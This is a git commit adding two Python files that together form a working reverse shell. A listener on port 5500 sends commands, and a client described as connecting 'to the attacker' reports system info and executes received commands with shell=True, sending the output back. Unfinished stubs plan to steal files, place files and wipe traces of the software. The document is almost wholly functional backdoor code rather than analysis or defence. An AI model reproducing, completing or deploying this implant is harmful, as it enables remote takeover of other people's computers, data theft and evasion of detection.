1cc9b58ec0b733498015bd9466da640b10be796a
sekthor <sysdroyed@gmail.com>
2019-09-04 13:14:32 +0200

    so far sending system commands works

---
+++ listener.py
@@ -0,0 +1,42 @@
+from socket import *
+
+HOST = ""
+PORT = 5500
+
+def listen():
+	s = socket(AF_INET, SOCK_STREAM)
+	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+	s.bind((HOST, PORT))
+	print("[*] Listening on port %s" % str(PORT))
+	s.listen(10)
+	sock, addr = s.accept()
+	return sock
+
+def main():
+	sock = listen()
+	data = sock.recv(1024).decode() # recv system info
+	print(data)
+	
+	while sock:
+		data = input("[>] ")
+
+
+		action = data.split()[0]
+		response = b"[!] No response"
+
+		if action == "system":
+			sock.send(data.encode())
+			response = sock.recv(1024)
+			
+		elif action == "steal":
+			# TODO
+			pass
+		elif action == "place":
+			# TODO
+			pass
+		else:
+			pass
+
+		print(response.decode())
+
+main()
---
+++ reverse-shell.py
@@ -0,0 +1,69 @@
+from socket import socket, AF_INET, SOCK_STREAM
+from platform import platform
+import subprocess
+
+
+
+
+# connects to the attacker
+# returns a socket
+def connect(host, port):
+	sock = socket(AF_INET, SOCK_STREAM)
+	sock.connect((host, port))
+	return sock
+
+# parses the received command
+# returns two values: the action to be done
+# and the parameter
+
+def parseCommand(raw):
+	command = raw.split(" ")
+	action = command[0]
+	del command[0]
+	parameter = " ".join(command)
+	return action, parameter
+
+
+def main():
+
+	host = "localhost"
+	port = 5500
+
+	info = ("System: " + platform()).encode()
+	sock = connect(host, port)
+	sock.send(info)
+
+
+	while sock:
+		raw = sock.recv(1024).decode()
+		action, parameter = parseCommand(raw)
+
+
+		if action == "quit":
+			# TODO: quit the programm
+			pass
+		elif action == "wipe":
+			# TODO: wipe all traces of software
+			pass
+		elif action == "system":
+			try:
+				proc = subprocess.Popen(parameter, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+				stdout_value = proc.stdout.read() + proc.stderr.read()
+				if stdout_value:
+					sock.send(stdout_value)
+				else:
+					sock.send(b' ')
+			except:
+				print("error")
+				pass
+			
+		elif action == "steal":
+			# TODO: send a file to listener
+			pass
+		elif action == "place":
+			# TODO: recieve a file form listener and save it
+			pass
+		else:
+			sock.send(b"Invalid command")
+
+main()
